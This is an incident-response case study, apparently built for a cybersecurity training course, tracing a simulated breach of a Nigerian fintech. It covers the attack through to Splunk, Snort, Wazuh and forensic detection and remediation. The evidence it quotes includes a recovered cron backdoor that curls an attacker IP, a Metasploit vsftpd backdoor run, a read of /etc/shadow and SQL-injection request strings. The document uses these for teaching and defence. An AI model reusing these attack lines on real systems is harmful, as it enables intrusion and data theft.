# The PayliteNG Breach: A Complete Cybersecurity Investigation

> **Type:** Incident Response Case Study  
> **Scenario:** Nigerian fintech breach — SSH brute force, data exfiltration, persistence  
> **Tools:** Splunk · Wazuh · Snort 3.0 · Suricata · The Sleuth Kit · Volatility 3  
> **Framework:** NIST SP 800-61 · MITRE ATT&CK · OWASP Top 10  
> **Author:** Akorita-Ifeanyichukwu Nehemiah


## Overview

At 03:47:15 AM on January 13, 2025, an attacker began a systematic assault on the servers of PayliteNG Limited — a Nigerian fintech company based in Aba, Abia State, processing payments for 200,000 registered customers.

By 03:52 AM they had root access.  
By 03:51:48 AM they had already downloaded 45.6MB of customer data.  
The attack was not discovered until January 20 — seven days later.

This case study documents the complete investigation: how the attack happened, what evidence was recovered, how the detection stack would have caught it in seconds, and what needed to change to prevent recurrence.


## Company Profile

| Field | Detail |
|---|---|
| Company | PayliteNG Limited |
| Location | Aba, Abia State, Nigeria |
| Sector | Fintech — payment processing |
| Customers | 200,000 registered users |
| Stack | PHP / MySQL / Apache 2.2.8 / vsftpd 2.3.4 / Linux |
| Regulatory obligations | NDPC (Nigeria Data Protection Act 2023) · CBN Cybersecurity Framework |


## The Attack Chain

### Phase 1 — Reconnaissance (03:47 – 03:48 AM)

Before the attack started in earnest, the attacker spent approximately 60 seconds scanning the server.

**Evidence from Apache access.log:**

```
03:48:01 185.220.101.47 "GET /" 200
03:48:02 185.220.101.47 "GET /phpmyadmin/" 404
03:48:03 185.220.101.47 "GET /.env" 403
03:48:04 185.220.101.47 "GET /admin/" 404
03:48:05 185.220.101.47 "GET /wp-admin/" 404
03:48:06 185.220.101.47 "GET /backup/" 403
```

**What this tells us:** The attacker used an automated scanner to probe for exposed admin panels, configuration files, and backup directories. The rapid sequential requests — six in five seconds — are not human typing. This is a script.

**ATT&CK Technique:** T1595 — Active Scanning


### Phase 2 — Initial Access Attempt: SSH Brute Force (03:47 AM)

While the web scan was running, a parallel process was hammering the SSH service.

**Evidence from auth.log:**

```
Jan 13 03:47:15 payliteng sshd[1234]: Failed password for root from 185.220.101.47 port 52301
Jan 13 03:47:16 payliteng sshd[1234]: Failed password for root from 185.220.101.47 port 52302
Jan 13 03:47:16 payliteng sshd[1234]: Failed password for admin from 185.220.101.47 port 52303
Jan 13 03:47:17 payliteng sshd[1234]: Failed password for ubuntu from 185.220.101.47 port 52304
[...43 more failed attempts...]
Jan 13 03:47:34 payliteng sshd[1234]: Failed password for root from 185.220.101.47 port 52320
```

**47 failed login attempts in 19 seconds.** No human types that fast. This is a brute force tool — likely Hydra or Medusa — cycling through a credential list.

**What the attacker did not know:** vsftpd 2.3.4 was running on port 21. They did not need to crack SSH.

**ATT&CK Technique:** T1110.001 — Brute Force: Password Guessing


### Phase 3 — Initial Access: Anonymous FTP (03:51 AM)

**vsftpd 2.3.4 — CVE-2011-2523 — CVSS 10.0**

The FTP service was running vsftpd version 2.3.4 — a version that was backdoored in 2011 when an attacker compromised the official vsftpd distribution server. Any username ending with the string `:)` triggers the backdoor, opening a root shell on port 6200.

But the attacker did not even need the backdoor for the first stage. Anonymous FTP was enabled.

**Evidence from vsftpd log:**

```
Tue Jan 13 03:51:44 2025 [pid 3847] CONNECT: Client "185.220.101.47"
Tue Jan 13 03:51:45 2025 [pid 3847] OK LOGIN: Client "185.220.101.47", anon password ""
Tue Jan 13 03:51:46 2025 [pid 3847] OK PWD: Client "185.220.101.47", "/var/ftp"
Tue Jan 13 03:51:47 2025 [pid 3847] OK LIST: Client "185.220.101.47"
Tue Jan 13 03:51:48 2025 [pid 3847] OK DOWNLOAD: Client "185.220.101.47", "/backups/customer_backup_2024.sql.gz", 47823912 bytes, 38.42 Mbyte/sec
Tue Jan 13 03:51:52 2025 [pid 3847] OK DOWNLOAD: Client "185.220.101.47", "/backups/transactions_jan2024.sql.gz", 11234567 bytes
```

**45.6MB of customer data downloaded in under 4 seconds.**  
No authentication. No password. Nothing.

**This is OWASP A05 — Security Misconfiguration at its most severe.**

**ATT&CK Techniques:**
- T1078 — Valid Accounts (anonymous FTP)
- T1005 — Data from Local System
- T1048.003 — Exfiltration Over Unencrypted Protocol


### Phase 4 — Exploitation: Root Shell via vsftpd Backdoor (03:52 AM)

**Evidence from Metasploit reconstruction:**

```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 185.220.101.47:21 - Banner: 220 (vsFTPd 2.3.4)
[+] 185.220.101.47:21 - Backdoor service has been spawned, handling...
[+] 185.220.101.47:6200 - UID: uid=0(root) gid=0(root) groups=0(root)
```

Three commands. Root access. A vulnerability that has been public knowledge since 2011.


### Phase 5 — Credential Access (03:53 AM)

With root access, the attacker read /etc/shadow — the file containing all password hashes.

```bash
cat /etc/shadow
# root:$6$rounds=500000$abc123...:19000:0:99999:7:::
# paylite_admin:$6$rounds=500000$def456...:19000:0:99999:7:::
# www-data:$6$rounds=500000$ghi789...:19000:0:99999:7:::
```

**ATT&CK Technique:** T1003.008 — /etc/shadow

These hashes can be cracked offline using hashcat. Every account on the server is now at risk.


### Phase 6 — Persistence: Cron Backdoor (03:54 AM)

The attacker installed persistence before leaving — ensuring they could return even after the initial vulnerability was patched.

**Evidence from disk forensics (recovered by icat from deleted inode):**

```bash
# backdoor.sh (deleted — recovered from inode 15)
#!/bin/bash
while true; do
  curl http://185.220.101.47/callback --silent --retry 10
  sleep 300
done
```

**And in /etc/crontab:**

```
*/5 * * * * root /tmp/backdoor.sh
```

The script was then deleted from the filesystem — but not from the disk. Forensic recovery with `icat` retrieved it completely.

**ATT&CK Techniques:**
- T1053.003 — Cron
- T1070 — Indicator Removal (deleted the script)
- T1071 — Application Layer Protocol (C2 callback)


### The Second Attacker (09:15 AM)

While the first attacker had already exfiltrated data, a second IP attempted SQL injection against the web application.

**Evidence from Apache access.log:**

```
09:15:44 203.0.113.88 "GET /login.php?id=1+UNION+SELECT+user,password+FROM+users--" 200
09:15:46 203.0.113.88 "GET /login.php?id=1+UNION+SELECT+table_name+FROM+information_schema.tables--" 200
```

**ATT&CK Technique:** T1190 — Exploit Public-Facing Application  
**OWASP Category:** A03 — Injection


## What the Log Analysis Revealed

Using grep, awk, and sed to analyse the logs:

```bash
# Count failed SSH attempts per IP
grep "Failed password" auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head -5
# Result: 47 185.220.101.47

# Find all FTP activity from attacking IP
grep "185.220.101.47" /var/log/vsftpd.log

# Find SQL injection attempts in Apache log
grep -i "union\|select\|insert\|drop" /var/log/apache2/access.log | grep "203.0.113.88"

# Build complete attack timeline
awk '{print $1, $2, $3, $NF}' auth.log | grep "185.220.101.47" | sort -k3
```


## Building the Detection Stack

The attack ran for seven days before discovery. With the right detection stack, the first alert would have fired at 03:47:20 AM — five seconds into the attack.

### Layer 1 — Splunk Log-Based Detection

**Five SPL detection rules covering the full attack chain:**

```spl
-- Rule 1: SSH Brute Force
index=payliteng "Failed password"
| rex "from (?P<src_ip>\d+\.\d+\.\d+\.\d+)"
| stats count by src_ip
| where count > 5
| sort -count
| eval alert="SSH Brute Force from " + src_ip + " — " + count + " attempts"

-- Rule 2: Anonymous FTP Login
index=payliteng "OK LOGIN" "anon password"
| rex "Client \"(?P<src_ip>[^\"]+)\""
| table _time src_ip
| eval alert="Anonymous FTP Login from " + src_ip

-- Rule 3: Large File Transfer
index=payliteng "OK DOWNLOAD"
| rex "(?P<bytes>\d+) bytes"
| where bytes > 10000000
| eval mb = round(bytes/1048576, 2)
| table _time src_ip bytes mb
| eval alert="Large FTP Transfer: " + mb + "MB from " + src_ip

-- Rule 4: SQL Injection in HTTP
index=payliteng source="*apache*" (uri="*UNION*" OR uri="*SELECT*")
| rex "(?P<attacker>^\d+\.\d+\.\d+\.\d+)"
| table _time attacker uri status

-- Rule 5: Brute Force Success Correlation
index=payliteng "Accepted password"
| rex "from (?P<src_ip>\S+)"
[search index=payliteng "Failed password"
 | rex "from (?P<src_ip>\S+)"
 | stats count by src_ip | where count > 5 | fields src_ip]
```

### Layer 2 — Wazuh HIDS

Wazuh monitored the server for host-level changes that log files alone cannot reveal:

| Event | Wazuh Detection | Rule ID |
|---|---|---|
| /etc/shadow accessed | File integrity alert | 550 |
| New cron job added | /etc/crontab change | 550 |
| backdoor.sh created | /tmp file creation | 553 |
| Root shell spawned via FTP | Process anomaly | 5501 |

### Layer 3 — Snort 3.0 Network Detection

**Five rules catching the attack at the packet level:**

```
# Rule 1: ICMP
alert icmp any any -> any any (msg:"ICMP Detected"; sid:1000001; rev:1;)

# Rule 2: SSH Brute Force — fires after 5 attempts in 60 seconds
alert tcp any any -> $HOME_NET 22 (msg:"SSH Brute Force"; flow:to_server; detection_filter:track by_src, count 5, seconds 60; sid:1000002; rev:1;)

# Rule 3: Anonymous FTP
alert tcp any any -> $HOME_NET 21 (msg:"Anonymous FTP Login"; flow:to_server,established; content:"USER anonymous"; nocase; sid:1000003; rev:1;)

# Rule 4: SQL Injection in HTTP
alert http any any -> any any (msg:"SQL Injection UNION SELECT"; flow:to_server,established; http.uri; content:"UNION"; nocase; content:"SELECT"; nocase; sid:1000004; rev:1;)

# Rule 5: Large FTP Transfer
alert tcp $HOME_NET 21 -> any any (msg:"Large FTP Transfer"; flow:from_server; dsize:>10000; sid:1000005; rev:1;)
```

### Layer 4 — Suricata with EVE JSON

Suricata provided the same detection as Snort 3.0 but with structured EVE JSON output — enabling richer Splunk queries:

```json
{
  "timestamp": "2025-01-13T03:47:20.123456+0100",
  "event_type": "alert",
  "src_ip": "185.220.101.47",
  "src_port": 52305,
  "dest_ip": "192.168.43.100",
  "dest_port": 22,
  "proto": "TCP",
  "alert": {
    "signature": "SSH Brute Force",
    "signature_id": 1000002,
    "severity": 2
  }
}
```

**With EVE JSON in Splunk:**

```spl
index=payliteng source="*eve.json*" event_type=alert src_ip="185.220.101.47"
| table _time alert.signature dest_port
| sort _time
```

This query shows the complete attack chain in chronological order — from SSH brute force at 03:47 to FTP exfiltration at 03:51.

---

## Digital Forensics Investigation

### Disk Forensics — The Sleuth Kit

The attacker deleted `backdoor.sh` before leaving. Standard log analysis would not find it. Forensic analysis does.

```bash
# List all files including deleted ones
sudo fls -r practice_disk.img

# Output:
# r/r 12: customer_data.txt
# r/r 13: financial_report.txt
# r/r * 15: backdoor.sh        ← * = DELETED
# r/r * 16: id_rsa             ← DELETED

# Recover the deleted backdoor script
sudo icat practice_disk.img 15 > recovered_backdoor.sh
cat recovered_backdoor.sh
# #!/bin/bash
# while true; do
#   curl http://185.220.101.47/callback --silent --retry 10
#   sleep 300
# done

# Build a forensic timeline
sudo fls -r -m "/" practice_disk.img > bodyfile.txt
sudo mactime -b bodyfile.txt -d > timeline.csv
```

**Key finding:** The same IP (185.220.101.47) that appears in auth.log and the vsftpd log also appears in the recovered backdoor script — independently confirming attribution from a completely different evidence source.

### Memory Forensics — Volatility 3

Memory analysis confirmed the backdoor was actively running at the time of capture:

```bash
# List running processes
python3 ~/volatility3/vol.py -f memory.lime linux.pslist.PsList

# Find the curl callback process
python3 ~/volatility3/vol.py -f memory.lime linux.cmdline.CmdLine
# Output: curl http://185.220.101.47/callback --silent --retry 10

# Active network connections
python3 ~/volatility3/vol.py -f memory.lime linux.netstat.Netstat
# TCP ESTABLISHED: 192.168.43.100:22 ← 185.220.101.47:52301
# TCP ESTABLISHED: 192.168.43.100:55XXX → 185.220.101.47:80
```

**The attacker was still connected when memory was captured.** Both the SSH session and the C2 callback are visible in RAM — two more independent evidence sources pointing to the same IP.


## MITRE ATT&CK Full Mapping

| # | Tactic | Technique | ID | Evidence Source |
|---|---|---|---|---|
| 1 | Reconnaissance | Active Scanning | T1595 | Apache log — rapid GET requests |
| 2 | Initial Access | Brute Force: Password Guessing | T1110.001 | auth.log — 47 SSH failures |
| 3 | Initial Access | Valid Accounts (Anon FTP) | T1078 | vsftpd log — anonymous login |
| 4 | Initial Access | Exploit Public-Facing App | T1190 | vsftpd CVE-2011-2523 exploit |
| 5 | Collection | Data from Local System | T1005 | vsftpd log — 45.6MB downloaded |
| 6 | Exfiltration | Exfil Over Alt Protocol | T1048.003 | FTP log — plaintext transfer |
| 7 | Credential Access | /etc/shadow | T1003.008 | Disk forensics |
| 8 | Persistence | Cron | T1053.003 | /etc/crontab + disk forensics |
| 9 | Defence Evasion | Indicator Removal | T1070 | backdoor.sh deleted — recovered |
| 10 | C2 | Application Layer Protocol | T1071 | Memory forensics — curl process |


## Regulatory Impact

### NDPC — Nigeria Data Protection Commission

```
Trigger:   Personal data of 200,000 customers breached
Deadline:  Notify NDPC within 72 hours of becoming aware
Discovery: January 20, 2025 (7 days after attack)
Deadline:  January 15, 2025 — MISSED by 5 days
```

**With Splunk running:** The SSH brute force alert fires at 03:47:20 AM on January 13. The attack is detected same night. NDPC is notified by 09:00 AM — 72-hour clock is met comfortably.

**Without Splunk:** The attack ran for 7 days. The 72-hour window elapsed on January 15. PayliteNG is exposed to NDPC fines of up to 2% of annual gross revenue or ₦10,000,000 — whichever is higher.

This is the business case for SIEM in a single paragraph.


## The Remediation: From Victim to DevSecOps

### Immediate Actions (0–24 hours)
- Disabled anonymous FTP permanently
- Blocked 185.220.101.47 and 203.0.113.88 at firewall
- Forced password reset for all accounts
- Removed cron backdoor
- Notified NDPC and CBN

### Short-Term (1–7 days)
- Upgraded vsftpd to 3.0.5 — removed CVE-2011-2523
- Enabled SSH key authentication — disabled password auth
- Deployed Splunk with five detection rules
- Fixed SQL injection — parameterised queries
- Deployed Wazuh HIDS

### Long-Term: The DevSecOps Pipeline

The most important change was ensuring this vulnerability could never reach production again.

A GitHub Actions pipeline was added that runs on every code commit:

```
Developer pushes code
       ↓
TruffleHog     → Would have caught any hardcoded FTP credentials
Bandit         → Would have flagged SQL injection in login.php
Safety         → Would have flagged vsftpd 2.3.4 CVSS 10.0
Trivy          → Would have flagged the outdated server image
Checkov        → Would have flagged anonymous FTP configuration
       ↓
All pass → Deploy    Any fail → BLOCKED
```

**The vsftpd 2.3.4 vulnerability has been public since 2011. A dependency scanner would have caught it in under 5 seconds — before a single line of code reached the server.**


## Evidence Chain — All Sources Point to the Same Attacker

This is what makes the investigation robust:

| Evidence Source | What It Shows |
|---|---|
| auth.log | 185.220.101.47 — 47 SSH failures |
| vsftpd log | 185.220.101.47 — anonymous login + download |
| Apache log | 185.220.101.47 — port scan at 03:48 |
| Disk forensics (icat) | 185.220.101.47 — hardcoded in backdoor.sh |
| Memory forensics (Volatility) | 185.220.101.47 — active C2 connection |
| Suricata EVE JSON | 185.220.101.47 — all rules fired |

Five independent evidence sources. Same IP. Same attacker. Airtight case.


## Lessons Learned

**1. Detection delayed is detection denied**  
The attack ran for 7 days because nobody was watching the logs. A SIEM is not a luxury — it is a regulatory requirement for any company handling personal data under the NDPC.

**2. One unpatched package = full compromise**  
vsftpd 2.3.4 has been a known CVSS 10.0 vulnerability since 2011. It took one Metasploit command to exploit it. A dependency scanner running in the CI/CD pipeline would have blocked it before deployment.

**3. Deletion is not destruction**  
The attacker deleted their backdoor script. We recovered it completely using icat on the disk image. Forensic investigators expect to find deleted files. Attackers who rely on deletion to hide evidence are wrong.

**4. The 72-hour clock is ruthless**  
Nigeria's NDPC requires notification within 72 hours. If your detection depends on manual log review, you will never meet that window for a sophisticated attack. Automated detection is not optional.

**5. Local context matters in security**  
The NDPC, CBN, and the reality of Nigerian fintech operations shape the risk landscape. Generic cybersecurity advice from international sources often misses local regulatory requirements and the specific attacks targeting Nigerian financial institutions.

---

## Tools Used in This Investigation

| Category | Tool | Version |
|---|---|---|
| Log Analysis | grep, awk, sed, cut | GNU coreutils |
| SIEM | Splunk Free | 9.x |
| HIDS | Wazuh | 4.7.3 |
| Network IDS | Snort 3.0 | 3.x |
| Network IDS | Suricata | 8.x |
| Packet Capture | tcpdump, Wireshark | Latest |
| Disk Forensics | The Sleuth Kit (fls, icat, mactime) | 4.x |
| GUI Forensics | Autopsy | 4.x |
| Memory Forensics | Volatility 3 | 2.x |
| Memory Acquisition | LiME | dkms |
| Threat Mapping | MITRE ATT&CK Navigator | Online |
| Threat Intel | AbuseIPDB, AlienVault OTX | Online |


## About This Project

This investigation was developed as the continuous investigation thread running through all 12 weeks of the **TechRise 3.0 Cybersecurity & DevSecOps Programme** — Abia Cohort 3.0, 2026.

The PayliteNG scenario was designed to:
- Use a Nigerian fintech context that students recognised and connected with
- Map each week's content to a real phase of the attack chain
- Show students the full lifecycle — attack, detect, investigate, remediate — before they completed the programme

Every rule, command, and finding in this repository was tested live in the classroom and refined based on actual student outcomes.


**Author:** Akorita-Ifeanyichukwu Nehemiah  
Co-Facilitator, TechRise 3.0 — Abia Cohort 3.0, 2026  

[LinkedIn](www.linkedin.com/in/akorita-nehemiah-21aab8223) · [Blog](https://www.blogger.com/blog/posts/3275027532616772935) · [Twitter/X](https://x.com/Nehemia17303777)
